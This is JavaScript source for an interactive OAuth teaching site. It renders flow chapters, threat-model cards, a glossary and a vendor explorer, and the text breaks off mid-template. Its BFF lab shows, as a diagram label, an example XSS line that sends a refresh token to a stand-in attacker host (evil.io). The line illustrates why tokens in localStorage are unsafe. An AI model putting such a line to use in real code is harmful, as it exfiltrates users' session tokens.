// ==========================================================================
// OAUTH ATLAS — Main Interactive Application Controller
// ==========================================================================

import { FLOWS, FLOW_MAP } from './data/flows.js?v=4.3';
import { VENDOR_MAPPINGS, ENTERPRISE_DEEPDIVES } from './data/enterprise.js?v=4.3';
import { OAUTH_21_RULES, DEPRECATED_FLOWS, HARDENING_CHECKLIST } from './data/reference.js?v=4.3';
import { GLOSSARY } from './data/glossary.js?v=4.3';
import { mountHeroConvergence } from './engine/hero-canvas.js?v=4.3';
import { createProtocolTheatre } from './engine/protocol-stage.js?v=4.3';
import { mountFlowLab } from './engine/live-labs.js?v=4.3';
import { highlightWire, renderXRayPanel, escapeHtml } from './engine/jwt-xray.js?v=4.3';
import { mountDecisionWizard } from './engine/decision-wizard.js?v=4.3';
import { sound } from './engine/sound.js?v=4.3';

let currentLens = 'both';
let currentAnimStyle = 'zones';
const allTheatres = new Map();
const labCleanups = [];
let activeEnterpriseTheatre = null;
let heroConvergence = null;
let journeyStops = [];
let syncJourneyRailActive = () => {};

// Turn "Flow 2: Client Credentials" or "Flow 6" inside "When NOT to Use" into clickable colored cross-flow pills without orphaned punctuation!
function hydrateCrossFlowLinks(text) {
  const safe = escapeHtml(text);
  return safe.replace(/Flow\s+(\d)(?::\s*([^).]+))?([).,:;]*)/g, (match, numStr, _lbl, trailing = '') => {
    const target = FLOWS.find(f => f.num === Number(numStr));
    if (!target) return match;
    return `<span style="white-space:nowrap"><button type="button" class="cross-flow-pill" style="--cf-c:${target.accent}" data-jump-flow="${target.id}">→ ${target.num} · ${escapeHtml(target.shortName)}</button>${trailing}</span>`;
  });
}

// Toast Helper
let toastTimer = null;
function showToast(msg) {
  const t = document.getElementById('toast');
  if (!t) return;
  t.textContent = msg;
  t.classList.add('show');
  clearTimeout(toastTimer);
  toastTimer = setTimeout(() => t.classList.remove('show'), 1400);
}

// Clipboard Helper
async function copyText(text, label = 'Copied to clipboard') {
  try {
    await navigator.clipboard.writeText(text);
    showToast(`✓ ${label}`);
  } catch {
    showToast('Copy unavailable in this browser context');
  }
}

// ==========================================================================
// 1. GLOSSARY MODAL (⌘K)
// ==========================================================================
const modalEl = document.getElementById('glossary-modal');
const modalInput = document.getElementById('glossary-search');
const modalBody = document.getElementById('glossary-results');

function renderGlossaryList(query = '', highlightId = null) {
  const q = query.trim().toLowerCase();
  const filtered = GLOSSARY.filter(
    g =>
      !q ||
      g.term.toLowerCase().includes(q) ||
      g.short.toLowerCase().includes(q) ||
      g.detail.toLowerCase().includes(q) ||
      g.tag.toLowerCase().includes(q)
  );

  if (!filtered.length) {
    modalBody.innerHTML = `<p style="color:var(--text-muted);text-align:center;padding:24px">No IAM concepts matched "${escapeHtml(query)}".</p>`;
    return;
  }

  modalBody.innerHTML = filtered
    .map(
      g => `
    <div class="glossary-card ${g.id === highlightId ? 'highlighted' : ''}" id="gloss-${g.id}">
      <div class="glossary-term-head">
        <h4>${escapeHtml(g.term)}</h4>
        <span class="badge rfc">${escapeHtml(g.tag)}</span>
      </div>
      <p style="font-size:0.88rem;font-weight:600;color:var(--text-primary);margin-bottom:6px">${escapeHtml(g.short)}</p>
      <p style="font-size:0.84rem;color:var(--text-secondary);line-height:1.6">${escapeHtml(g.detail)}</p>
      ${
        g.analogy
          ? `<div style="margin-top:8px;font-size:0.8rem;color:var(--ch-front);font-style:italic">💡 Analogy: ${escapeHtml(g.analogy)}</div>`
          : ''
      }
    </div>`
    )
    .join('');

  if (highlightId) {
    setTimeout(() => {
      const target = document.getElementById(`gloss-${highlightId}`);
      if (target) target.scrollIntoView({ behavior: 'smooth', block: 'center' });
    }, 60);
  }
}

function openGlossary(termId = null) {
  modalEl.classList.add('open');
  modalInput.value = '';
  renderGlossaryList('', termId);
  if (!termId) modalInput.focus();
}

function closeGlossary() {
  modalEl.classList.remove('open');
}

// ==========================================================================
// 2. INTERACTIVE BFF vs. VULNERABLE localStorage LAB (Section 1)
// ==========================================================================
function initBffLab() {
  const stage = document.getElementById('bff-stage-wrap');
  const btnVuln = document.getElementById('bff-mode-vuln');
  const btnSafe = document.getElementById('bff-mode-safe');
  const btnXss = document.getElementById('bff-trigger-xss');
  const statusEl = document.getElementById('bff-status');
  if (!stage) return;

  let mode = 'safe';
  let xssTriggered = false;

  function render() {
    const isSafe = mode === 'safe';
    btnSafe.className = `toggle-pill ${isSafe ? 'active safe' : ''}`;
    btnVuln.className = `toggle-pill ${!isSafe ? 'active danger' : ''}`;

    if (!isSafe) {
      stage.innerHTML = `
        <svg class="bff-svg" viewBox="0 0 820 190">
          <rect x="20" y="34" width="230" height="122" rx="16" fill="rgba(244,63,94,0.10)" stroke="${xssTriggered ? 'var(--stage-ch-attack)' : 'var(--stage-ch-front)'}" stroke-width="2"/>
          <text x="135" y="62" text-anchor="middle" fill="var(--stage-node-title)" font-family="Plus Jakarta Sans, sans-serif" font-size="13" font-weight="800">Browser SPA (Untrusted)</text>
          <rect x="40" y="78" width="190" height="58" rx="10" fill="var(--stage-bff-box)" stroke="${xssTriggered ? 'var(--stage-ch-attack)' : 'var(--stage-ch-front)'}" stroke-dasharray="5 4"/>
          <text x="135" y="101" text-anchor="middle" fill="var(--stage-ch-front)" font-family="JetBrains Mono, monospace" font-size="10.5" font-weight="700">localStorage.getItem('AT')</text>
          <text x="135" y="121" text-anchor="middle" fill="${xssTriggered ? 'var(--stage-ch-attack)' : 'var(--stage-node-sub)'}" font-family="JetBrains Mono, monospace" font-size="10">${xssTriggered ? '☠️ EXFILTRATED BY XSS!' : 'Raw Access + Refresh Token'}</text>

          <line x1="250" y1="95" x2="565" y2="95" stroke="${xssTriggered ? 'var(--stage-ch-attack)' : 'var(--stage-ch-front)'}" stroke-width="2.2" stroke-dasharray="6 5"/>
          <text x="408" y="82" text-anchor="middle" fill="${xssTriggered ? 'var(--stage-ch-attack)' : 'var(--stage-ch-front)'}" font-family="JetBrains Mono, monospace" font-size="10.5" font-weight="700">${xssTriggered ? 'fetch("https://evil.io?steal="+RT)' : 'Authorization: Bearer <AT> from JS'}</text>

          <rect x="570" y="45" width="225" height="100" rx="16" fill="var(--stage-bff-card)" stroke="${xssTriggered ? 'var(--stage-ch-attack)' : 'var(--ch-back-alt)'}" stroke-width="2"/>
          <text x="682" y="86" text-anchor="middle" fill="var(--stage-node-title)" font-family="Plus Jakarta Sans, sans-serif" font-size="13" font-weight="800">${xssTriggered ? 'Attacker Server (evil.io)' : 'Protected API (RS)'}</text>
          <text x="682" y="110" text-anchor="middle" fill="${xssTriggered ? 'var(--stage-ch-attack)' : 'var(--stage-node-sub)'}" font-family="JetBrains Mono, monospace" font-size="10">${xssTriggered ? 'Attacker owns Alice’s session!' : 'Tokens exposed to every JS script'}</text>
        </svg>
      `;
      statusEl.style.color = '';
      statusEl.className = xssTriggered ? 'bff-status is-danger' : 'bff-status is-warn';
      statusEl.innerHTML = xssTriggered
        ? '🚨 <strong>BREACH!</strong> A single compromised npm package or third-party ad/analytics script ran <code>localStorage.getItem("refresh_token")</code> and exfiltrated Alice’s tokens silently.'
        : '⚠️ Storing OAuth tokens in <code>localStorage</code> makes them readable by <em>any</em> JavaScript running on the page. Click <strong>Simulate XSS Script</strong> to see the impact.';
    } else {
      stage.innerHTML = `
        <svg class="bff-svg" viewBox="0 0 820 190">
          <rect x="16" y="34" width="210" height="122" rx="16" fill="rgba(56,189,248,0.10)" stroke="var(--stage-ch-local)" stroke-width="2"/>
          <text x="121" y="62" text-anchor="middle" fill="var(--stage-node-title)" font-family="Plus Jakarta Sans, sans-serif" font-size="13" font-weight="800">Browser SPA</text>
          <rect x="26" y="78" width="190" height="58" rx="10" fill="var(--stage-bff-box)" stroke="var(--stage-ch-back)"/>
          <text x="121" y="101" text-anchor="middle" fill="var(--stage-ch-back)" font-family="JetBrains Mono, monospace" font-size="10.5" font-weight="700">HttpOnly; Secure Cookie</text>
          <text x="121" y="121" text-anchor="middle" fill="${xssTriggered ? 'var(--stage-ch-back)' : 'var(--stage-node-sub)'}" font-family="JetBrains Mono, monospace" font-size="9.5">${xssTriggered ? '🛡️ JS BLOCKED (HttpOnly)' : 'Zero tokens in browser JS!'}</text>

          <line x1="226" y1="95" x2="310" y2="95" stroke="var(--stage-ch-local)" stroke-width="2.2"/>
          <text x="268" y="82" text-anchor="middle" fill="var(--stage-ch-local)" font-family="JetBrains Mono, monospace" font-size="10">Cookie only</text>

          <rect x="308" y="24" width="240" height="142" rx="16" fill="rgba(16,185,129,0.12)" stroke="var(--stage-ch-back)" stroke-width="2.4"/>
          <text x="428" y="54" text-anchor="middle" fill="var(--stage-ch-back)" font-family="Plus Jakarta Sans, sans-serif" font-size="13" font-weight="800">Backend-for-Frontend (BFF)</text>
          <text x="428" y="74" text-anchor="middle" fill="var(--stage-bff-sub)" font-family="JetBrains Mono, monospace" font-size="10">Next.js / Gateway / SAP AppRouter</text>
          <rect x="322" y="88" width="212" height="60" rx="10" fill="var(--stage-bff-bg)" stroke="var(--stage-ch-back)"/>
          <text x="428" y="112" text-anchor="middle" fill="var(--stage-node-title)" font-family="JetBrains Mono, monospace" font-size="10.5" font-weight="700">🔒 Encrypted Token Vault</text>
          <text x="428" y="132" text-anchor="middle" fill="var(--stage-ch-back)" font-family="JetBrains Mono, monospace" font-size="10">Holds AT + RT strictly server-side</text>

          <line x1="548" y1="95" x2="626" y2="95" stroke="var(--stage-ch-back)" stroke-width="2.4"/>
          <text x="587" y="82" text-anchor="middle" fill="var(--stage-ch-back)" font-family="JetBrains Mono, monospace" font-size="10">Bearer AT</text>

          <rect x="630" y="45" width="174" height="100" rx="16" fill="var(--stage-bff-card)" stroke="var(--ch-back-alt)" stroke-width="2"/>
          <text x="717" y="88" text-anchor="middle" fill="var(--stage-node-title)" font-family="Plus Jakarta Sans, sans-serif" font-size="13" font-weight="800">Protected API</text>
          <text x="717" y="110" text-anchor="middle" fill="var(--stage-node-sub)" font-family="JetBrains Mono, monospace" font-size="10">Verifies Bearer JWT</text>
        </svg>
      `;
      statusEl.style.color = '';
      statusEl.className = 'bff-status is-safe';
      statusEl.innerHTML = xssTriggered
        ? '🛡️ <strong>XSS BLOCKED!</strong> Even if rogue JavaScript runs in the browser, <code>HttpOnly</code> cookies are invisible to JS and the real Access/Refresh tokens sit sealed inside the BFF server!'
        : '✅ <strong>What is a BFF?</strong> A thin server proxy in front of your SPA acting as a Confidential Client. It locks tokens in Redis/server memory, gives the browser ONLY an <code>HttpOnly; Secure; SameSite=Lax</code> cookie, and injects <code>Authorization: Bearer</code> on outbound API calls.';
    }
  }

  btnSafe.addEventListener('click', () => {
    mode = 'safe';
    xssTriggered = false;
    sound.playTone('back');
    render();
  });
  btnVuln.addEventListener('click', () => {
    mode = 'vuln';
    xssTriggered = false;
    sound.playTone('front');
    render();
  });
  btnXss.addEventListener('click', () => {
    xssTriggered = true;
    sound.playTone(mode === 'safe' ? 'success' : 'attack');
    render();
  });

  render();
}

// ==========================================================================
// 3. PROGRESSIVE FLOWS 1–8 CHAPTER RENDERER & FLOATING JOURNEY RAIL
// ==========================================================================
function scrollToFlow(flowId) {
  const el = document.getElementById(`flow-${flowId}`);
  if (!el) return;
  const section = el.closest('section');
  if (section) {
    section.classList.add('visible');
    section.querySelectorAll('.reveal').forEach(r => r.classList.add('visible'));
  }
  el.querySelectorAll('.reveal').forEach(r => r.classList.add('visible'));
  if (heroConvergence) heroConvergence.highlight(flowId);
  syncJourneyRailActive(`flow-${flowId}`);
  el.scrollIntoView({ behavior: 'smooth', block: 'start' });
}

function mountFlowChapter(flow, parentEl) {
  const idx = FLOWS.findIndex(f => f.id === flow.id);
  const prevFlow = idx > 0 ? FLOWS[idx - 1] : null;
  const nextFlow = idx < FLOWS.length - 1 ? FLOWS[idx + 1] : null;
  const hasAttackSim = Boolean(flow.modes && flow.modes.some(m => m.type === 'attack'));

  const article = document.createElement('article');
  article.className = 'flow-chapter-article';
  article.id = `flow-${flow.id}`;
  article.dataset.flowId = flow.id;
  article.style.setProperty('--flow-c', flow.accent);

  const footerNextHtml =
    flow.num === 3
      ? `<a href="#bff-milestone" class="btn-primary">🛡️ Next Milestone: Stop Token Theft with BFF →</a>`
      : nextFlow
      ? `<button type="button" class="btn-primary" data-nav-flow="${nextFlow.id}">↓ Next: Flow ${nextFlow.num} — ${escapeHtml(nextFlow.shortName)}</button>`
      : `<a href="#enterprise" class="btn-primary">↓ Continue to Chapter 5: Enterprise Vendors →</a>`;

  const footerPrevHtml = prevFlow
    ? `<button type="button" class="btn-secondary" data-nav-flow="${prevFlow.id}">↑ Flow ${prevFlow.num}: ${escapeHtml(prevFlow.shortName)}</button>`
    : `<a href="#foundation" class="btn-secondary">↑ Review Chapter 1 Basics</a>`;

  article.innerHTML = `
    ${
      flow.bridge
        ? `<div class="flow-bridge-banner"><span class="flow-bridge-step">FLOW ${flow.num} · WHY IT EXISTS</span><span>${escapeHtml(flow.bridge)}</span></div>`
        : ''
    }

    <div class="flow-hero-card" style="border-top:3px solid ${flow.accent}">
      <div class="flow-hero-top">
        <div style="flex:1;min-width:260px">
          <div class="flow-badges">
            <span class="badge flow-accent-badge">FLOW ${flow.num} OF 8 · ${escapeHtml(flow.group)}</span>
            <span class="badge rfc">${escapeHtml(flow.rfc)}</span>
          </div>
          <h3 class="flow-title">${flow.num}. ${escapeHtml(flow.name)}</h3>
          <div class="urn-pill">
            <span>grant_type=${escapeHtml(flow.grantType)}</span>
            <button type="button" class="copy-mini" data-action="copy-urn">Copy URN</button>
          </div>
        </div>
        <div class="beginner-only art-frame-card" style="width:240px">
          <div class="art-frame-inner">
            <img src="${flow.art}" alt="${escapeHtml(flow.artCaption)}" style="width:100%;height:135px;object-fit:cover;display:block" loading="lazy"/>
            <div style="padding:7px 10px;font-family:var(--font-mono);font-size:0.75rem;color:#cbd5e1;text-align:center;background:linear-gradient(180deg,rgba(6,9,19,0.7),#060913)">${escapeHtml(flow.artCaption)}</div>
          </div>
        </div>
      </div>

      <p style="font-size:1.02rem;color:var(--text-primary);margin-top:10px;line-height:1.68">${escapeHtml(flow.atAGlance)}</p>

      <!-- High-Signal Entry Points right in the Flow Hero -->
      <div class="hero-jump-bar">
        <span style="font-family:var(--font-mono);font-size:0.75rem;color:var(--text-dim);text-transform:uppercase;letter-spacing:0.06em">Jump:</span>
        <button type="button" class="jump-pill" data-jump-dock="lab">🧪 Lab</button>
        <button type="button" class="jump-pill" data-jump-dock="wire">🧬 Token X-Ray</button>
        <button type="button" class="jump-pill threat" data-jump-dock="threats">🛡️ Threat Model <span class="pill-count">${flow.threats.length}</span></button>
        <button type="button" class="jump-pill pitfall" data-jump-dock="pitfalls">⚠️ Prod Pitfalls <span class="pill-count">${flow.pitfalls.length}</span></button>
      </div>

      <div class="analogy-box beginner-only">
        <span class="analogy-icon">💡</span>
        <div>
          <strong style="display:block;font-family:var(--font-display);font-size:0.88rem;color:var(--ch-front);margin-bottom:3px">Real-World Mental Model</strong>
          <p style="font-size:0.9rem;color:var(--text-secondary);line-height:1.6">${escapeHtml(flow.analogy)}</p>
        </div>
      </div>

      <div class="when-grid beginner-only">
        <div class="when-card yes">
          <h4>✓ When to Use</h4>
          <ul>${flow.whenYes.map(w => `<li>${hydrateCrossFlowLinks(w)}</li>`).join('')}</ul>
        </div>
        <div class="when-card no">
          <h4>✕ When NOT to Use (Click a Pill to Jump!)</h4>
          <ul>${flow.whenNo.map(w => `<li>${hydrateCrossFlowLinks(w)}</li>`).join('')}</ul>
        </div>
      </div>
    </div>

    <!-- Animated Kinetic Protocol Theatre (With Built-in Side-by-Side Wire HTTP!) -->
    <div data-slot="theatre-mount"></div>

    <!-- Unified Flow Deep-Dive Tab Dock -->
    <div class="flow-dock-shell" data-slot="dock-shell" style="scroll-margin-top:84px">
      <div class="flow-dock-bar">
        <div class="flow-dock-tabs" role="tablist" aria-label="Flow ${flow.num} deep-dive sections">
          <button type="button" class="dock-tab active" role="tab" data-dock="lab">🧪 Lab</button>
          <button type="button" class="dock-tab" role="tab" data-dock="wire">🧬 Token X-Ray</button>
          <button type="button" class="dock-tab" role="tab" data-dock="threats">🛡️ Threat Model <span class="dock-badge">${flow.threats.length}</span></button>
          <button type="button" class="dock-tab" role="tab" data-dock="pitfalls">⚠️ Prod Pitfalls <span class="dock-badge">${flow.pitfalls.length}</span></button>
        </div>
        <button type="button" class="stage-btn" data-action="dock-expand" style="padding:6px 11px;font-size:0.75rem" title="Toggle between focused tabs and full stacked view">⊞ Stack All</button>
      </div>

      <div class="flow-dock-body">
        <!-- Tab 1: Hands-On Lab -->
        <div data-dock-panel="lab" data-slot="lab-mount"></div>

        <!-- Tab 2: Full-Width Token X-Ray Claims Decoder -->
        <div data-dock-panel="wire" style="display:none">
          <div class="code-panel" data-slot="xray-mount"></div>
        </div>

        <!-- Tab 3: Active-Recall Security & Threat Model -->
        <div data-dock-panel="threats" style="display:none">
          <div class="threat-showcase-head">
            <div>
              <h4 style="font-family:var(--font-display);font-size:1.12rem;font-weight:800;margin-bottom:3px">🛡️ Security &amp; Threat Model — ${escapeHtml(flow.shortName)}</h4>
              <p style="font-size:0.84rem;color:var(--text-muted)">Test your instincts first, then click <strong>Reveal Defense</strong> (or reveal all at once).</p>
            </div>
            <div style="display:flex;gap:8px;flex-wrap:wrap">
              <button type="button" class="stage-btn" data-action="reveal-all-defenses">👁 Reveal All Defenses</button>
              ${
                hasAttackSim
                  ? `<button type="button" class="stage-btn attack-toggle mode-active" data-action="launch-live-attack">▶ Watch Attack Live</button>`
                  : ''
              }
            </div>
          </div>
          <div class="threat-matrix-grid">
            ${flow.threats
              .map(
                (t, ti) => `
              <article class="threat-card-v2" data-threat-card="${ti}">
                <div class="threat-card-top">
                  <div class="threat-card-title">
                    <span class="threat-idx">VECTOR 0${ti + 1}</span>
                    <h5>${escapeHtml(t.name)}</h5>
                  </div>
                  <span class="badge threat-status-unmitigated" data-threat-status="${ti}">UNMITIGATED</span>
                </div>
                <div class="threat-vs-grid">
                  <div class="threat-half attack-side">
                    <span class="half-label">⚡ How Attackers Exploit It</span>
                    <p>${escapeHtml(t.mechanism)}</p>
                  </div>
                  <div class="threat-bridge-arrow" aria-hidden="true">→</div>
                  <div class="threat-half defense-side defense-veil-wrap concealed" data-defense-wrap="${ti}">
                    <span class="half-label">🛡️ Cryptographic &amp; Policy Defense</span>
                    <p class="defense-text">${escapeHtml(t.mitigation)}</p>
                    <div class="reveal-defense-overlay">
                      <button type="button" class="stage-btn primary" data-reveal-one="${ti}" style="font-size:0.76rem;padding:6px 13px">👁 Reveal Defense</button>
                    </div>
                  </div>
                </div>
              </article>`
              )
              .join('')}
          </div>
        </div>

        <!-- Tab 4: Production Pitfalls -->
        <div data-dock-panel="pitfalls" style="display:none">
          <div class="threat-showcase-head">
            <div>
              <h4 style="font-family:var(--font-display);font-size:1.12rem;font-weight:800;margin-bottom:3px">⚠️ Production Pitfalls — Real-World Outage Patterns</h4>
              <p style="font-size:0.84rem;color:var(--text-muted)">Common engineering mistakes that pass staging tests and break in production.</p>
            </div>
            <button type="button" class="stage-btn" data-open-bff="true">🔎 Open IAM Glossary (BFF / nonce / jti)</button>
          </div>
          <div class="pitfall-grid-v2">
            ${flow.pitfalls
              .map(
                (p, pi) => `
              <article class="pitfall-card-v2">
                <div class="pitfall-kicker">
                  <span>PITFALL 0${pi + 1}</span>
                  <span>PROD INCIDENT</span>
                </div>
                <h5>${escapeHtml(p.name)}</h5>
                <p>${escapeHtml(p.detail)}</p>
              </article>`
              )
              .join('')}
          </div>
        </div>
      </div>
    </div>

    <div class="flow-nav-footer">
      <div>${footerPrevHtml}</div>
      <div>${footerNextHtml}</div>
    </div>
  `;

  parentEl.appendChild(article);

  // Scoped cross-flow jump pills & footer flow buttons
  article.querySelectorAll('[data-jump-flow]').forEach(btn => {
    btn.addEventListener('click', () => scrollToFlow(btn.dataset.jumpFlow));
  });
  article.querySelectorAll('[data-nav-flow]').forEach(btn => {
    btn.addEventListener('click', () => scrollToFlow(btn.dataset.navFlow));
  });

  // Active-Recall Reveal Defense handlers scoped to this flow chapter
  function revealDefenseCard(cardIdx) {
    const wrap = article.querySelector(`[data-defense-wrap="${cardIdx}"]`);
    const card = article.querySelector(`[data-threat-card="${cardIdx}"]`);
    const badge = article.querySelector(`[data-threat-status="${cardIdx}"]`);
    if (wrap) wrap.classList.remove('concealed');
    if (card) card.classList.add('revealed');
    if (badge) {
      badge.textContent = 'MITIGATED ✓';
      badge.classList.remove('threat-status-unmitigated');
      badge.classList.add('threat-status-mitigated');
    }
  }

  article.querySelectorAll('[data-reveal-one]').forEach(btn => {
    btn.addEventListener('click', () => {
      sound.playTone('success');
      revealDefenseCard(btn.dataset.revealOne);
    });
  });

  let allRevealed = false;
  const revAllBtn = article.querySelector('[data-action="reveal-all-defenses"]');
  if (revAllBtn) {
    revAllBtn.addEventListener('click', () => {
      allRevealed = !allRevealed;
      if (allRevealed) {
        sound.playTone('success');
        flow.threats.forEach((_, ti) => revealDefenseCard(ti));
        revAllBtn.textContent = '🙈 Hide Defenses (Quiz Mode)';
      } else {
        flow.threats.forEach((_, ti) => {
          const wrap = article.querySelector(`[data-defense-wrap="${ti}"]`);
          const card = article.querySelector(`[data-threat-card="${ti}"]`);
          const badge = article.querySelector(`[data-threat-status="${ti}"]`);
          if (wrap) wrap.classList.add('concealed');
          if (card) card.classList.remove('revealed');
          if (badge) {
            badge.textContent = 'UNMITIGATED';
            badge.classList.remove('threat-status-mitigated');
            badge.classList.add('threat-status-unmitigated');
          }
        });
        revAllBtn.textContent = '👁 Reveal All Defenses';
      }
    });
  }

  article.querySelector('[data-action="copy-urn"]').addEventListener('click', () => copyText(flow.grantType, 'Copied grant_type URN'));

  const theatreMount = article.querySelector('[data-slot="theatre-mount"]');

  const theatre = createProtocolTheatre({
    container: theatreMount,
    config: flow,
    getLens: () => currentLens,
    getAnimStyle: () => currentAnimStyle,
    onCopy: copyText
  });
  allTheatres.set(flow.id, theatre);

  // Flow Dock Tab Controller + Expand All Toggle
  let stackedMode = false;
  let activeDockTab = currentLens === 'expert' ? 'wire' : 'lab';
  const dockTabs = article.querySelectorAll('[data-dock]');
  const dockPanels = article.querySelectorAll('[data-dock-panel]');
  const expandBtn = article.querySelector('[data-action="dock-expand"]');
  const dockShell = article.querySelector('[data-slot="dock-shell"]');

  function setDockTab(tabName, scrollIntoView = false) {
    stackedMode = false;
    activeDockTab = tabName;
    expandBtn.textContent = '⊞ Stack All';
    dockTabs.forEach(t => t.classList.toggle('active', t.dataset.dock === tabName));
    dockPanels.forEach(p => {
      p.style.display = p.dataset.dockPanel === tabName ? 'block' : 'none';
      p.style.marginBottom = '0';
    });
    if (scrollIntoView && dockShell) {
      dockShell.scrollIntoView({ behavior: 'smooth', block: 'start' });
    }
  }

  dockTabs.forEach(t => {
    t.addEventListener('click', () => {
      sound.playTone('local');
      setDockTab(t.dataset.dock, false);
    });
  });

  article.querySelectorAll('[data-jump-dock]').forEach(btn => {
    btn.addEventListener('click', () => {
      sound.playTone('local');
      setDockTab(btn.dataset.jumpDock, true);
    });
  });

  expandBtn.addEventListener('click', () => {
    stackedMode = !stackedMode;
    if (stackedMode) {
      expandBtn.textContent = '◫ Back to Tabs';
      dockTabs.forEach(t => t.classList.remove('active'));
      dockPanels.forEach((p, i) => {
        p.style.display = 'block';
        p.style.marginBottom = i < dockPanels.length - 1 ? '28px' : '0';
      });
    } else {
      setDockTab(activeDockTab, false);
    }
  });

  const liveAtkBtn = article.querySelector('[data-action="launch-live-attack"]');
  if (liveAtkBtn) {
    liveAtkBtn.addEventListener('click', () => {
      theatre.launchAttackMode();
      if (theatreMount) theatreMount.scrollIntoView({ behavior: 'smooth', block: 'center' });
    });
  }

  const glossBtn = article.querySelector('[data-open-bff]');
  if (glossBtn) {
    glossBtn.addEventListener('click', () => openGlossary(flow.id === 'auth-code-pkce' ? 'bff' : null));
  }

  setDockTab(activeDockTab, false);

  const labCleanup = mountFlowLab(article.querySelector('[data-slot="lab-mount"]'), flow.interactiveLab, openGlossary);
  if (typeof labCleanup === 'function') labCleanups.push(labCleanup);
  renderXRayPanel(article.querySelector('[data-slot="xray-mount"]'), flow.xrayArtifacts);
}

function initProgressiveFlows() {
  labCleanups.forEach(fn => {
    try {
      fn();
    } catch {}
  });
  labCleanups.length = 0;
  allTheatres.forEach(t => {
    try {
      t.destroy();
    } catch {}
  });
  allTheatres.clear();

  const buckets = [
    { container: document.getElementById('level-1-flows'), flows: FLOWS.slice(0, 3) },
    { container: document.getElementById('level-2-flows'), flows: FLOWS.slice(3, 6) },
    { container: document.getElementById('level-3-flows'), flows: FLOWS.slice(6, 8) }
  ];

  buckets.forEach(({ container, flows }) => {
    if (!container) return;
    container.innerHTML = '';
    flows.forEach(flow => mountFlowChapter(flow, container));
  });
}

function initJourneyRail() {
  const rail = document.getElementById('journey-rail');
  if (!rail) return;

  const getAccent = id => FLOW_MAP[id]?.accent || 'var(--accent-primary)';
  const stops = [
    { targetId: 'top', label: '★', tip: 'Start · Convergence Map' },
    { targetId: 'foundation', label: 'B', tip: 'Ch 1 · 2-Min Basics' },
    { sep: true },
    { targetId: 'flow-auth-code-pkce', flowId: 'auth-code-pkce', label: '1', tip: 'Flow 1 · Auth Code + PKCE', accent: getAccent('auth-code-pkce') },
    { targetId: 'flow-client-credentials', flowId: 'client-credentials', label: '2', tip: 'Flow 2 · Client Credentials', accent: getAccent('client-credentials') },
    { targetId: 'flow-refresh-token', flowId: 'refresh-token', label: '3', tip: 'Flow 3 · Refresh Rotation', accent: getAccent('refresh-token') },
    { targetId: 'bff-milestone', label: '🛡️', tip: 'Milestone · BFF Security Lab' },
    { sep: true },
    { targetId: 'flow-jwt-bearer', flowId: 'jwt-bearer', label: '4', tip: 'Flow 4 · JWT Bearer', accent: getAccent('jwt-bearer') },
    { targetId: 'flow-saml2-bearer', flowId: 'saml2-bearer', label: '5', tip: 'Flow 5 · SAML 2.0 Bearer', accent: getAccent('saml2-bearer') },
    { targetId: 'flow-token-exchange', flowId: 'token-exchange', label: '6', tip: 'Flow 6 · Token Exchange', accent: getAccent('token-exchange') },
    { sep: true },
    { targetId: 'flow-device-code', flowId: 'device-code', label: '7', tip: 'Flow 7 · Device Auth', accent: getAccent('device-code') },
    { targetId: 'flow-ciba', flowId: 'ciba', label: '8', tip: 'Flow 8 · CIBA Push', accent: getAccent('ciba') },
    { sep: true },
    { targetId: 'enterprise', label: 'V', tip: 'Ch 5 · Vendor Rosetta' },
    { targetId: 'synthesis', label: 'M', tip: 'Ch 6 · Mastery & Audit' }
  ];

  journeyStops = stops.filter(s => !s.sep);

  rail.innerHTML = stops
    .map(s =>
      s.sep
        ? `<span class="j-sep" aria-hidden="true"></span>`
        : `<button type="button" class="j-dot ${s.targetId === 'top' ? 'active' : ''}" data-jtarget="${s.targetId}" data-tip="${escapeHtml(s.tip)}" aria-label="${escapeHtml(s.tip)}" style="${s.accent ? `--dot-c:${s.accent}` : ''}">${s.label}</button>`
    )
    .join('');

  syncJourneyRailActive = targetId => {
    rail.querySelectorAll('.j-dot').forEach(btn => {
      btn.classList.toggle('active', btn.dataset.jtarget === targetId);
    });
  };

  rail.querySelectorAll('.j-dot').forEach(btn => {
    btn.addEventListener('click', () => {
      const stop = journeyStops.find(s => s.targetId === btn.dataset.jtarget);
      if (!stop) return;
      if (stop.targetId === 'top') {
        syncJourneyRailActive('top');
        window.scrollTo({ top: 0, behavior: 'smooth' });
        return;
      }
      if (stop.flowId) {
        scrollToFlow(stop.flowId);
        return;
      }
      const el = document.getElementById(stop.targetId);
      if (el) {
        const sec = el.closest('section') || el;
        sec.classList.add('visible');
        sec.querySelectorAll('.reveal').forEach(r => r.classList.add('visible'));
        syncJourneyRailActive(stop.targetId);
        el.scrollIntoView({ behavior: 'smooth', block: 'start' });
      }
    });
  });
}

// ==========================================================================
// 4. PROTOCOL ROSETTA STONE — ENTERPRISE VENDOR EXPLORER & DEEP-DIVES
// ==========================================================================
const VENDOR_META = {
  'SAP BTP': { color: '#0ea5e9', mono: 'SAP' },
  'Microsoft Entra ID': { color: '#3b82f6', mono: 'MS' },
  Salesforce: { color: '#06b6d4', mono: 'SF' },
  'Google Cloud': { color: '#10b981', mono: 'GCP' },
  AWS: { color: '#f59e0b', mono: 'AWS' },
  MuleSoft: { color: '#a855f7', mono: 'MSF' }
};

function rfcBucketOf(item) {
  const r = item.rfc.toLowerCase();
  if (r.includes('8693') || r.includes('token-exchange')) return 'RFC 8693 · Token Exchange / OBO / Cloud STS';
  if (r.includes('7522') || r.includes('saml2')) return 'RFC 7522 · SAML 2.0 Bearer Assertion';
  if (r.includes('7523 §2.1')) return 'RFC 7523 §2.1 · JWT Bearer Grant';
  if (r.includes('client_credentials') || r.includes('§4.4')) return 'RFC 6749 §4.4 · Client Credentials (+ §2.2 Auth)';
  if (r.includes('refresh')) return 'RFC 6749 §6 · Refresh Token';
  return 'Gateway / Resource Server Enforcement';
}

function renderRosettaCard(v) {
  const meta = VENDOR_META[v.vendor] || { color: '#38bdf8', mono: 'IAM' };
  const isDialect = v.rfc.includes('Goal:') || v.rfc.includes('Semantic:');
  const flowObj = FLOW_MAP[v.flowId];
  const showMono = !v.vendor.toUpperCase().startsWith(meta.mono.toUpperCase());
  return `
    <article class="rosetta-card" style="--v-color:${meta.color}">
      <div class="rosetta-top">
        <div class="rosetta-vendor-row">
          <span class="rosetta-vendor-pill">
            ${showMono ? `<span class="rosetta-monogram">${meta.mono}</span>` : `<i class="v-dot" style="background:${meta.color};width:8px;height:8px;border-radius:50%;display:inline-block"></i>`}
            <span>${escapeHtml(v.vendor)}</span>
          </span>
          <span class="rosetta-ui-label">Config Profile</span>
        </div>
